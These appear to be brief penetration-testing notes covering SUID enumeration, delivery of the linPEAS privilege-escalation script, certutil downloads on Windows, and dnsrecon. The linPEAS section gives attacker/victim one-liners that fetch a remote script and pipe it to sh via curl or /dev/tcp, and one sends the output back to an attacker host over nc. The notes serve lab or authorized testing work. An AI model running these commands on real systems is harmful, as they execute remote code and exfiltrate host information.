

looks for bad permissions in SUID
find / -type f -perm -4000 2>/dev/null 

virtual host routing


[**PEASS-ng**](https://github.com/peass-ng/PEASS-ng)
```
# From public github
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Local network
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim

# Use a linpeas binary
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64

```

to grab a file to a windows computer 
certutil.exe -urlcache -f http://<lhost>/<filename> <name>

certutil is better for windows

dnsrecon for finding domains

dnsrecon -r 127.0.0.1/24 -n <ip> -d <make up a domain>

1